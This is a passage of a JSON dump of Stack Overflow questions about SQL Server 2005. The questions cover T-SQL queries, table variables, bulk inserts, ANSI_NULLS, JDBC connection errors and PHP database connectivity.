1 SQL profiler Result</h2>\n\n<p>Reads => 56, Duration => 4</p>\n\n<h2>Query - 2</h2>\n\n<pre><code>Select T1.*, K.* from \n(\n    Select id, nam from t Where id = 1\n)K\nInner Join t1 T1 on T1.id = K.id\n</code></pre>\n\n<h2>Query 2 SQL Profiler Results</h2>\n\n<p>Reads => 262 and Duration => 2</p>\n\n<p>You can also see my <strong><a href=\"http://www.sqlfiddle.com/#!3/28e39/1\" rel=\"nofollow\">SQlFiddle</a></strong></p>\n\n<p>Query - Which query should be used and why?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":34,"score":2,"question_id":11084006,"title":"ms sql list of tables which do not have update permissions","body":"<p>I want to get list of tables in a given database and a given schema which do not have update permissions for a given user. </p>\n\n<p>How can I do it?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":11274605,"title":"Must declare the scalar variable @tempTbl","body":"<p>I get this error even though i have tried what other post suggested still the same error\nbut when i run select it works OK...\nany help would be greatly appreciated</p>\n\n<pre><code> ALTER PROCEDURE UpdateCustomers\n\n    @XML AS XML\n\nAS \nDECLARE @tempTbl TABLE(\n     tblID INT ,\n     Customer_name NVARCHAR(30),\n     Customer_Code NVARCHAR(10)\n\n)\n\nINSERT INTO @tempTbl(tblID, Customer_name, Customer_Code)\nSELECT\n    Item.element.value('@tblID', 'int'),\n    Item.element.value('@Customer_name', 'nvarchar(30)'),\n    Item.element.value('@Customer_Code', 'nvarchar(10)')\n\nFROM\n    @xml.nodes('/root/item') AS Item(element)\n\n\n--SELECT * FROM @tempTbl---it runs ok\n\n\n\nUPDATE dbo.Customers\n SET\n                     dbo.Customers.Customer_name =  @tempTbl.Customer_name, \n                     dbo.Customers.Customer_Code = @tempTbl.Customer_Code\nfrom dbo.Customers\n                inner join @tempTbl\n                    on Customers.tblID =@tempTbl.tblID\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11271634,"title":"Differences between select @var=column1 from table1 & select top 1 column1 from table1","body":"<p>In sql server 2005</p>\n\n<p>differences between <code>select @var=column1 from table1</code> &amp; <code>select top 1 column1 from table1</code> </p>\n\n<p>I have a problem with a view that has a column in select statement at this model</p>\n\n<pre><code>select column0, fn(column0) as col from table2\n</code></pre>\n\n<p>that <code>fn</code> return <code>select @var=column1 from table1 where table1.column3=@inputid</code></p>\n\n<p>I replace it with this</p>\n\n<pre><code>select \n    column0, \n    (select top 1 column1 from table1 where table1.id = table2.column0) as col \nfrom  table2\n</code></pre>\n\n<p>but result is not same as previous</p>\n\n<p>and using order by in  </p>\n\n<pre><code>select top 1 column1 from table1 where table1.id = table2.column0\n</code></pre>\n\n<p>has no effect too</p>\n\n<p>I need to know why can I change   </p>\n\n<pre><code> select top 1 column1 from table1 where table1.id = table2.column0 \n</code></pre>\n\n<p>that has same result as </p>\n\n<pre><code> select @var=column1 from table1 where table1.column3 = @inputid\n</code></pre>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":11272733,"title":"ANSI_NULLS  flag in SQL Server?","body":"<p>I can change the value of <code>SET ANSI_NULLS</code> by using <code>SET ANSI_NULLS OFF</code> or <code>SET ANSI_NULLS ON</code></p>\n\n<p><kbd>Question #1</kbd>  how can I get the <em>current</em> value ?</p>\n\n<p><kbd>Question #2</kbd>  does setting a value is applied to query? Table? Instance? Whole db?</p>\n\n<p><kbd>Question #3</kbd> If I'm entering a company which does <code>if myNullParam &lt;&gt;null</code>, what is the place which I should check (db ? schema? query ?) to tell them - <em>this gonna work  , or Not</em> ?</p>\n\n<p>thanks.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":874,"score":2,"question_id":1213183,"title":"How to sort the result set of an UPDATE statement that uses the OUTPUT clause?","body":"<p>I'd like to sort the rows returned by an UPDATE statement, but there's no direct way to do this according to the <a href=\"http://msdn.microsoft.com/en-us/library/ms177564%28SQL.90%29.aspx\" rel=\"nofollow\">msdn page for the OUTPUT Clause</a>, which says:</p>\n\n<blockquote>\n  <p>SQL Server does not guarantee the order in which rows are processed and returned by DML statements using the OUTPUT clause.</p>\n</blockquote>\n\n<p>Since I can't just tack \"order by\" onto my original query, my next approach is to just put the results into a temporary table or table variable, and then select and order from that.  I should be able to figure out a solution using temporary tables, but I don't think I've ever used a table variable before.  Is there a reason to prefer one over the other in this context?  Or is there a better way to get sorted results from an OUTPUT clause (i.e. w/out using a temp table or table variable)?</p>\n\n<p>The DB platform is SQL Server 2005.</p>\n\n<p>Here's the original query; I want to sort on the ReleaseDate field.</p>\n\n<pre><code>Update dbo.WFItem\nSet ApprovedDate = getdate()\nOutput inserted.WFItemID, inserted.Title, inserted.Teaser\nWhere ApprovedDate is null\n</code></pre>\n\n<p>The table it runs against looks something like this:</p>\n\n<pre><code>CREATE TABLE [dbo].[WFItem](\n    [WFItemID] [int] IDENTITY(1,1) NOT NULL,\n    [Title] [varchar](255) NULL,\n    [Teaser] [varchar](255) NULL,\n    [ReleaseDate] [datetime] NULL,\n    [ApprovedDate] [datetime] NULL,\n    [SentDate] [datetime] NULL,\n CONSTRAINT [PK_WFItem] PRIMARY KEY CLUSTERED \n(\n    [WFItemID] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, \n ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n"},{"tags":["sql-server-2005","asp.net-mvc-3","entity-framework-4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":204,"score":0,"question_id":6525635,"title":"Entity Data Model - Adding a keyless table","body":"<p>Visual studio is giving me a trail of errors that I have hit a dead end on. I am trying to add an existing table in a database to my data model. I understand that the table should have a key, but it doesn't and I can't fix that; it isn't my database to re-design.</p>\n\n<p>When I first try to add the table, I get this error:</p>\n\n<blockquote>\n  <p>The table/view\n  'BT8_GC.dbo.SAVED_QUERY_CATEGORY' does\n  not have a primary key defined and no\n  valid primary key could be inferred.\n  This table/view has been excluded. To\n  use the entity, you will need to\n  review your schema, add the correct\n  keys, and uncomment it.</p>\n</blockquote>\n\n<p>Ok, fine, I'll define the keys for it and uncomment. Here is the block I uncomment, after manually defining the keys (I also had to add the nullable=false part):</p>\n\n<pre><code>      &lt;EntityType Name=\"SAVED_QUERY_CATEGORY\"&gt;\n    &lt;Key&gt;\n      &lt;PropertyRef Name=\"SQC_CAT_ID\"/&gt;\n      &lt;PropertyRef Name=\"SQC_USER_ID\"/&gt;\n    &lt;/Key&gt;\n    &lt;Property Name=\"SQC_CAT_ID\" Type=\"int\" Nullable=\"false\" /&gt;\n    &lt;Property Name=\"SQC_USER_ID\" Type=\"int\" Nullable=\"false\" /&gt;\n    &lt;Property Name=\"SQC_CAT_DSCR\" Type=\"varchar\" MaxLength=\"50\" /&gt;\n    &lt;Property Name=\"SQC_SEQ_NO\" Type=\"int\" /&gt;\n  &lt;/EntityType&gt;\n</code></pre>\n\n<p>Nope, now the designer won't open. Go back into the file, and Intellisense shows this error:</p>\n\n<blockquote>\n  <p>Error 11002: Entity Type 'SAVED_QUERY_CATEGORY' has no entity set.</p>\n</blockquote>\n\n<p>Ok... Uncommenting created a new error. After adding an entity set:</p>\n\n<pre><code>&lt;EntitySet Name=\"SAVED_QUERY_CATEGORY\" EntityType=\"IssueModel.Store.SAVED_QUERY_CATEGORY\" store:Type=\"Tables\" Schema=\"dbo\" /&gt;\n</code></pre>\n\n<p>Yay! The designer opens! Still not there yet, because while it shows up under the store's Tables/Views folder, it has not Entity Type in the model. Can't call it from my code. I don't have any errors to work off though, so I tried creating an entity set mapping, but that results in the error \"does not exist in MetadataWorkspace\".</p>\n\n<p>So that's what I have tried. How do I get this poorly designed table into my data model?</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":97,"score":2,"question_id":6136324,"title":"Is it possible to assign to a UNIQUEIDENTIFIER field automatically in each insertion?","body":"<p>I have a table in which I have an INT IDENTITY(1,1) PRIMARY KEY field, and right next to it an UNIQUEIDENTIFIER field which I would like to be automatically assigned upon each insertion on the table. I tried setting DEFAULT NEWID(), but it only works if I do <code>INSERT INTO TableName VALUES (DEFAULT, a, b, c, d, ...).</code> What I would like would be to be able to do I<code>NSERT INTO TableName VALUES (a, b, c, d, ...)</code> and the UNIQUEIDENTIFIER field be automatically assigned just like the primary key field. Is that possible? Please not that, although it is a valid thing to do, I don't want to have this field as (part of a) primary key for the table.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":219,"score":0,"question_id":11263909,"title":"create view with cursor or loop","body":"<p>I have managed to create a table from a cursor that inserted rows from similarly named tables in my database. It worked succesfully, but I would like to create a view so that I don't need to update my original query. I may be going down the wrong route using a cursor, but my current query is:</p>\n\n<pre><code>use LaganPDM\nset nocount on \ndeclare @table varchar(128)\ndeclare @cmd varchar(500) \ncreate table SPECIAL_CASE_FORMS_2 (table_name varchar(128), flods_id numeric(22,0) PRIMARY KEY, lgncc_id numeric(22,0), case_enquiry_id numeric(22,0),amount varchar(4000), costcode varchar(4000), jobcompletedate varchar(4000), jobreleasedate varchar(4000),paymentstatus varchar(4000))\ndeclare tables cursor for\nselect table_name\nfrom information_schema.tables\n   where table_name like '%SPECIAL_UP_C00%'\nand left(right(table_name, 24),9) &gt; '101000363'\nand not left(right(table_name, 24),9) in('101000487', '101000507', '101000510')\nopen tables\nfetch next from tables into @table\nwhile @@fetch_status = 0\nbegin\n  set @cmd = 'select ''' + @table + ''', * from ' + @table \ninsert into SPECIAL_CASE_FORMS_2 exec (@cmd)\n  fetch next from tables into @table\nEND\nCLOSE tables \nDEALLOCATE tables\nselect  * from SPECIAL_CASE_FORMS_2\n</code></pre>\n\n<p>I've tried to adapt this and create a view, but am having no luck. Any suggestions would be gratefully received, even if this means going down a different route.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":54,"score":-2,"question_id":4303423,"title":"I a table Trn_Clear having columns [SplitUpKey]       ,[Clr_Key]       ,[FeeComponent]       ,[Amt]","body":"<p>In this table, column <code>FeeComponent</code> contains three types of value suppose <code>a</code>, <code>b</code>, <code>c</code> and regarding <code>Amt</code> having price.</p>\n\n<pre><code>   A   40 \n   A   20\n   B   30\n   B   20\n   B   40\n   c   60\n</code></pre>\n\n<p>Now I want Result in the form of a table like</p>\n\n<pre><code>A,B,C\n</code></pre>\n\n<p><code>Amount</code> by <code>FeeComponent</code>-wise.\nIt's a single Table.</p>\n\n<p>I tried Something like:</p>\n\n<pre><code>Select \n    (Select Amt from Trn_Clear where Amt='A') As 'A1',\n    (Select Amt From Trn_Clear where Amt='B') As 'B1' \nFrom  Trn_Clear\n</code></pre>\n"},{"tags":["sql-server-2005","web-hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":4320334,"title":"best asp.net 2.0 and sql server hosting sites","body":"<p>can anybody suggest me about best asp.net 2.0 and sql server 2005 hosting where sql server database initial size is 1GB and can grow upto 50GB(lets assume   if community based website, records would be deleted by community).no sqlserver reporting.I might need to get backup (.bak files manually or by scripts). Websites contain a webservice as well. I am sacred of scam sites , so I am not searching it on google.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","transactions"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2226,"score":2,"question_id":980143,"title":"How to check that there is transaction that is not yet committed in SQL Server 2005?","body":"<p>Does anyone know the command to check if there is an un-committed transaction in SQL Server 2005?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":8,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":80,"score":1,"question_id":11262341,"title":"Explain SQL Query execution in this case","body":"<p>I am using a sql query i.e.</p>\n\n<pre><code>SELECT * FROM TABLE_NAME\n</code></pre>\n\n<p>In this Table_Name table has 10 rows and 5 columns. When I run this above query it runs fine and return 10 rows and 5 columns.</p>\n\n<p>Now I am running a new query i.e.</p>\n\n<pre><code>SELECT 8 FROM TABLE_NAME\n</code></pre>\n\n<p>Now it will return only a single column but 10 rows and this single column has same values i.e. 8 in each row.</p>\n\n<p>I want to know that why it return me 10 rows and a column which has only 8 value and when i am using * instead of 8 in that case it will return 10 rows and 5 columns. </p>\n\n<p>What exactly the difference between both queries and its execution process? </p>\n"},{"tags":["c#","linq","sql-server-2005","linq-to-sql","integration-testing"],"answer_count":6,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":1292,"score":7,"question_id":1554634,"title":"LINQ to SQL Cannot create database [Schema Permissions]","body":"<p>For some integration tests I want to use LINQ to SQL to drop/re-create the test database. I've had this working fine before, however in this project the database is split up into several schemas. </p>\n\n<p>When I try to run the <code>ctx.CreateDatabase()</code> command I'm getting this exception:</p>\n\n<blockquote>\n  <p>The specified schema name \"xyz\" either\n  does not exist or you do not have\n  permission to use it.</p>\n</blockquote>\n\n<p>The login I'm using to do this has the role <code>dbcreator</code> - Does it need further permissions? Surely a login with persmissions to create a database should be able to create everything contained in that database also?</p>\n\n<h2>Update:</h2>\n\n<p>Since it looks like there isn't a solution to this problem using LINQtoSQL, does anyone have recommendations of any similiar tools to generate a db that are preferably free? Ideally I don't want to have to muck about hand writing sql build scripts.</p>\n"},{"tags":["sql","sql-server-2005","ssms"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":11259654,"title":"SMSS Formatting of characters","body":"<p>In SSMS 2005, If I inset the following character () it changes the font of adjacent letters and I'm unsure why. It doesn't seem to have any adverse effect as it selects the data I want (which are parts of a order number) but I'd like to ensure that the character isn't altering the data in anyway. Is it just a visual change or are the characters actually changing?</p>\n\n<p><img src=\"http://i.stack.imgur.com/71Nb2.png\" alt=\"enter image description here\"></p>\n\n<pre><code>SELECT \n'Hello',\n'Hello',\n'He110',\n</code></pre>\n\n<p>EDIT: Output when adding <code>N</code> as per the comments.</p>\n\n<p><img src=\"http://i.stack.imgur.com/NZcAB.png\" alt=\"enter image description here\"></p>\n"},{"tags":["sql-server","sql-server-2005","sqlcmd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":207,"score":0,"question_id":8471519,"title":"sqlcmd - How to display all the set option setting values","body":"<p>What is the command in sqlcmd to show all the set options and their associated settings?</p>\n\n<p>For example how do you show the current value for nocount?</p>\n\n<pre><code>set\nset nocount\nset nocount ?\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","migration","backup"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":343,"score":3,"question_id":7724175,"title":"Transfer database from 2008 R2 back to 2005","body":"<p>My company has to go back to Sql Server 2005 from 2008R2 (legacy issues with scripts and customer deployment.. ) and I got the task to find out how to do that: is there any automated migration tools (Redgate, MS, whatever) for doing this?</p>\n\n<p>There are several (around 10) databases, all of them containing from 20 up to 220 tables.</p>\n\n<p>If there are no known tools, is there a way in form of scripts? I know SQL server can generate scripts (with and without data I think?), but under what circumstances/restrictions is it possible to migrate the schemes? If possible with data migration, but if not empty tables must do.</p>\n"},{"tags":["sql-server-2005","jdbc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":11256268,"title":"JDBC API forName exception (ClassNotFoundException)","body":"<p>I am new to JDBC application development. I am writing a JDBC application using Visual Studio 2005. I need to connect my application to MS SQL Server 2005. I have installed the JDBC driver 3.0. Also Java runtime version 1.6 is intalled on my machine.</p>\n\n<p>I am writing a simple code to connect to the SQL server. I have set the CLASSPATH in inviromnet variable list. Here is the code</p>\n\n<pre><code>package MyJDBCApp;\n\nimport java.sql.*;\nimport java.util.*;\n\npublic class Connect\n{\n   public static void main(String[] args)\n   {\n        String url = \"jdbc:sqlserver://NOI1-501791:1433;databaseName=test;user=sa; password=asdf1234;\";\n        Connection con;\n        Statement stmt;\n        try\n        {\n           Class.forName(\"com.sqlserver.jdbc.SQLServerDriver\");\n        }\n        catch (java.lang.ClassNotFoundException e)\n        {\n           System.err.print(\"ClassNotFoundException: \");\n           System.err.println(e.getMessage());\n        }\n        try\n        {\n            con = DriverManager.getConnection(url);\n            if (con != null)\n                con.close();\n        }\n        catch (SQLException ex)\n        {\n           System.err.println(\"SQLException: \" + ex.getMessage());\n        }   \n   }\n}\n</code></pre>\n\n<p>When I try to debug this application everytime I am getting Class not found exception. \nCan anybody help me to resolve this problem.</p>\n\n<p>Thanks in advance.\nRegards\nZubair</p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11256429,"title":"Hosting SQL Server 2005 to website","body":"<p>I may seem silly asking this question. But since I am still a learner, I'm posting this question.</p>\n\n<p>I have launched my asp.net website but I a unable to understand as to how to host the database i.e., SQL Server 2005. I have added the mdf file to the remote website, changed the connection string in the web.config to localhost as  the data source. </p>\n"},{"tags":["sql-server-2005","installation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":11256028,"title":"Issue in sql server 2005 installing","body":"<p>I tried to install sql server 2005.After the installation  i want to  open sql server 2005.So i just click stat -> All Programs -> Microsoft SQL Server 2005  but only sub menu(Configuration Tools) is there which is highlighted in below figure.So I can't open the sql server 2005.</p>\n\n<p><img src=\"http://i.stack.imgur.com/HytCk.png\" alt=\"Sql\"></p>\n\n<p>the above screen sort is taken from another system.</p>\n\n<p><img src=\"http://i.stack.imgur.com/1WX37.png\" alt=\"i have\"></p>\n\n<p>the above screen sort is taken from my ssytem.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-server-2008"],"answer_count":12,"favorite_count":7,"up_vote_count":29,"down_vote_count":4,"view_count":43964,"score":25,"question_id":861778,"title":"How to avoid the \"divide by zero\" error in SQL?","body":"<p>I hate this error message:</p>\n\n<pre><code>Msg 8134, Level 16, State 1, Line 1\nDivide by zero error encountered.\n</code></pre>\n\n<p>What is the best way to write SQL code, so that I will never see this error message again?</p>\n\n<p>I mean, I could add a where clause so that my divisor is never zero.  Or I could add a case statement, so that there is a special treatment for zero. Is the best way to use a NullIf clause?  </p>\n\n<p>Is there better way, or how can this be enforced?</p>\n"},{"tags":["sql-server-2005","vb.net-2010"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":380,"score":-1,"question_id":11221921,"title":"Date time format in vb.net","body":"<p>I am using following query to get data from SQL Server 2005 using VB.NET 4.0</p>\n\n<pre><code>strSQL = \"SELECT EmpNo,\n                 Sum(Cast(Substring(OTHours, 0, 3)AS FLOAT)) AS Hour,\n                 Sum(Cast(Substring(OtHours, 4, 5)AS FLOAT)) AS Minutes\n          FROM   TMSTrans\n          WHERE  CONVERT(VARCHAR, datein, 103) &gt;= '01/06/2012'\n                 AND CONVERT(VARCHAR, datein, 103) &lt;= '27/06/2012'\n          GROUP  BY EmpNo\"\n</code></pre>\n\n<p>But incorrect data is returned - I think it's a date range problem. In the table I have a datetime field in which data exists like <code>01/04/2012 00:00:00</code>. Can anyone help?</p>\n"},{"tags":["sql","sql-server","database","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":11247870,"title":"can't insert records in new table from existing table in sql server 2005","body":"<p>I need to insert records into a new table from an existing table. I used the following query to do this:</p>\n\n<pre><code>Insert into Newtable\nSelect * from Oldtable where date1 = @date\n</code></pre>\n\n<p>This query works most of the time, but in one scenario I get 10 million records to be inserted for the date1 value. In this case I'm getting the following error message:</p>\n\n<blockquote>\n  <p>Error : The transaction log for database \"tempDB\" is full. To find out why space in the log cannot be reused, see the log_reuse_wait_desc column in sys.databases</p>\n</blockquote>\n\n<p>Should I break the query into parts and insert them sequentially, or is there a way to do this with the current query?</p>\n"},{"tags":["android","sql","sql-server-2005","stored-procedures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":11252543,"title":"How to get information from database for the first and other times in Android?","body":"<p>I have a screen that shows one multiple choice question after logging in the application. </p>\n\n<p>I need to request(with an AsyncTask) a question with a questionId(Ids are auto incremented and may not be sequential).</p>\n\n<p>So how should I request a question with a questionId for the first time and how should I increment questionId in request for getting next question when I clicked next question button?</p>\n\n<p>I use MSSQL server and stored procedures. </p>\n\n<p>p.s: Does anyone know how to select a column(questionId) in the next row in stored procedures?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":11249982,"title":"Incomprehensible query result looking for rows in a query which are not in other query","body":"<p>I'm gettintg crazy with the result of this query</p>\n\n<p>This query returns 29.970 rows (distinct IdDireccionIne):</p>\n\n<pre><code>select distinct IdDireccionIne from DireccionIne as DI\n</code></pre>\n\n<p>This query returns 29.544 rows (distinct IdDireccionIne):</p>\n\n<pre><code>select distinct IdDireccionIne from DireccionCorregida \n  where IdDireccionIne is not null\n</code></pre>\n\n<p>I want to look for the IdDireccionIne of the first query (29.970 rows) which are not in the second query (29.544) I should get 29.970 - 29.544 = 426 record.</p>\n\n<pre><code>select distinct IdDireccionIne from DireccionIne as DI  -- 29.970\nwhere IdDireccionIne not in\n(select distinct IdDireccionIne from DireccionCorregida \n where IdDireccionIne is not null) -- 29.544\n</code></pre>\n\n<p>Surprisingly I get 0 rows!! What is wrong with this query?</p>\n\n<p>EDIT: I've even copied and pasted the results of the two queries in Excel and I found by hand some records of the first result which are not in the second one. I've checked it many times. I'm not worng. What can be wrong with this? IdDireccionIne is an int in both tables.</p>\n\n<p>2nd EDIT: As suggested by one comment, if I do this:</p>\n\n<pre><code>select * from (select distinct IdDireccionIne from DireccionIne as DI) as T1\nfull outer join\n(select distinct IdDireccionIne from DireccionCorregida \n   where IdDireccionIne is not null) as T2\non T1.IdDireccionIne = T2.IdDireccionIne\nwhere T1.IdDireccionIne is null or T2.IdDireccionIne is null\n</code></pre>\n\n<p>I get the expected 426 rows with values on the left side and nulls on the right side. But I still don't understand why my original query doesn't find them.</p>\n"},{"tags":["sql-server-2005","bulkinsert","file-format"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":11248184,"title":"sql server bulk insert text field wrong format","body":"<p>I have used a format file to do a bulk insert and found that the field I have imported appears as chinese instead of english text. Unusual since the import file saved as UTF-8 contains english characters.</p>\n\n<pre><code>8.0\n1\n1       SQLNCHAR  0   100    \"\"   3   QueryTerms    SQL_Latin1_General_CP1_CI_AS\n</code></pre>\n\n<p>text as it appears now</p>\n\n<pre><code>\n</code></pre>\n\n<p>text as it supposed to appear</p>\n\n<pre><code>new media\n</code></pre>\n"},{"tags":["sql-server","performance","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":222,"score":1,"question_id":11245980,"title":"SQL Server - insert large number of rows?","body":"<p><em>I've read many answers here about this topic, but everyone suggests the <kbd>BCP</kbd> || <kbd>SqlBulkCopy</kbd> class from .net</em></p>\n\n<p>I have a query which inserts into <code>targetTable</code> the <em>union</em> of 5 <code>selects</code> from different tables.</p>\n\n<p>I have correct indexes on the tables being selected. And only 1 clustered identity index on the <code>targetTable</code>. However this takes a long time (~25 min). I'm talking about 5M rows (x 20 columns).</p>\n\n<p>When I look at <kbd>sp_who2</kbd>, most of the time, it is <code>suspended</code>...</p>\n\n<p>I want to use <code>bulk</code> copy but <em>not</em> from .net (the db already fetches the data - so I don't need to go to C#).</p>\n\n<p><strong>Questions</strong></p>\n\n<ul>\n<li>How can I use bulk insert (no bcp) in my select command?</li>\n<li>Also, why is it suspended most of time? How can I give my query a higher <em>priority</em>?</li>\n</ul>\n\n<p>Thank you.</p>\n\n<p><em>p.s. I can't use <code>bcp</code> here because of security restrictions... I don't have permission to run this.</em></p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":90,"score":2,"question_id":11244442,"title":"how to insert into table but only if the record doesnt exist","body":"<p>I've got a table that stores the following:</p>\n\n<pre><code>JobID\nValidationItemID\nCreatedBy\n</code></pre>\n\n<p>I want to be able to insert into this table (a predefined template) but only add rows that dont exist.  What I mean by dont exist is the combination of JobID and ValidationItemID make the row unique.  My procedure passes in a JobID, but I cannot pass in a validation item ID as I pull this column as part of the template...</p>\n\n<p>Something to this effect:</p>\n\n<pre><code>CREATE PROCEDURE insTemplate \n    @JobID varchar(50),\n    @Login varchar(50)\nAS\nBEGIN\n    -- SET NOCOUNT ON added to prevent extra result sets from\n    -- interfering with SELECT statements.\n    SET NOCOUNT ON;\n\n    -- Insert statements for procedure here\n    INSERT INTO\n            ValidationItemSignOff\n                (\n                    JobID,  \n                    ValidationItemID,\n                    CreatedBy\n                )\n\n        SELECT \n        DISTINCT\n            @JobID,\n            vi.ValidationItemID,\n            @Login\n        FROM\n            RunOffAnswer roa\n        INNER JOIN\n            Method m ON m.MethodID = roa.MethodID\n        INNER JOIN\n            RunOffValidationItem vi ON vi.ValidationItemID = m.ValidationItemID\n        WHERE\n            vi.Inactive=0\n            AND NOT EXISTS(SELECT * FROM ValidationItemSignOff WHERE JobID=@JobID AND vi.ValidationItemID ???\nEND\nGO\n</code></pre>\n\n<p>I dont know how to phrase the where condition so that it doesn't reinsert the same JobID and ValidationItemID.  Lets say I have inside the table:</p>\n\n<pre><code>Job      ValidationItem\nJob A          1\nJob A          2\nJob A          5\n</code></pre>\n\n<p>And I have a template with the following:</p>\n\n<pre><code>ValidationItem\n1\n2\n3\n4\n5\n6\n</code></pre>\n\n<p>When I run my stored procedure it should only insert values 3,4,6 from the template table, for the job id... So I need help with my where condition.</p>\n\n<p>I think my issue is I cannot use <code>NOT EXISTS</code>, maybe I need to join back to this ValidationItemSignOff table itself on <code>JobID</code> and <code>ValidationItemID</code> where <code>ValidationItemID</code> is NULL, maybe like this:</p>\n\n<pre><code>CREATE PROCEDURE insTemplate \n    @JobID varchar(50),\n    @Login varchar(50)\nAS\nBEGIN\n    -- SET NOCOUNT ON added to prevent extra result sets from\n    -- interfering with SELECT statements.\n    SET NOCOUNT ON;\n\n    -- Insert statements for procedure here\n    INSERT INTO\n            ValidationItemSignOff\n                (\n                    JobID,  \n                    ValidationItemID,\n                    CreatedBy\n                )\n\n        SELECT \n        DISTINCT\n            @JobID,\n            vi.ValidationItemID,\n            @Login\n        FROM\n            RunOffAnswer roa\n        INNER JOIN\n            Method m ON m.MethodID = roa.MethodID\n        INNER JOIN\n            RunOffValidationItem vi ON vi.ValidationItemID = m.ValidationItemID\n        RIGHT OUTER JOIN\n            ValidationItemSignOff viso ON viso.JobID = @JobID\n                  AND viso.ValidationItemID = vi.ValidationItemID\n        WHERE\n            vi.Inactive=0\n            AND viso.ValidationItemID IS NULL\nEND\nGO\n</code></pre>\n\n<h1>Got it I think</h1>\n\n<p>Replacing the right join with this:</p>\n\n<pre><code>LEFT JOIN\n        ValidationItemSignOff viso\n        ON  viso.JobID = @JobID\n        AND viso.ValidationItemID = vi.ValidationItemID\n</code></pre>\n"}]}
{"total":14387,"page":16,"pagesize":100,"questions":[{"tags":["php","sql-server","sql-server-2005","php-5.3","deprecated"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":153,"score":0,"question_id":11244470,"title":"mssql_connect no longer working as of PHP 5.3","body":"<p>I just received an email from our host and they've upgraded our PHP to 5.3, unfortunately though, all the scripts have now broken. I traced it down to the function <strong>mssql_connect</strong> failing. Support told me this has now been deprecated under 5.3 - how can this be true?</p>\n\n<p>How can you connect to a mssql database under PHP 5.3 now??</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":11240321,"title":"Check for signature on module before alter","body":"<p>I have signed modules in SQL Server 2008 databases. In case someone alters signed modules (proc or trigger) i want to print information message, that has to re-sign procedure and print TSQL code to do that (there are appropriate rights). </p>\n\n<p>How and what is the best way to do that?</p>\n\n<p>DDL triggers seems no to be suitable for this need, as inside trigger module is already altered and think i can not find out if it was signed before.</p>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":11239530,"title":"SQL Server 2005 update trigger","body":"<p>I have a SQL Server 2005 database and that is effected by malicious contents on daily basis. Like links or scripts. That content is mostly added in the last of database <code>varchar</code> type column.</p>\n\n<p>I want an <code>instead of</code> trigger that fires when an update query runs containing following tags:    <code>&lt;/a&gt;</code> or <code>&lt;img</code> or <code>&lt;script</code>.</p>\n\n<p>And this trigger must cancel this update query.</p>\n"},{"tags":["sql-server","sql-server-2005","sqlprofiler","sql-server-profiler"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11224622,"title":"Failed to save trace data to table - Profiler stops with this 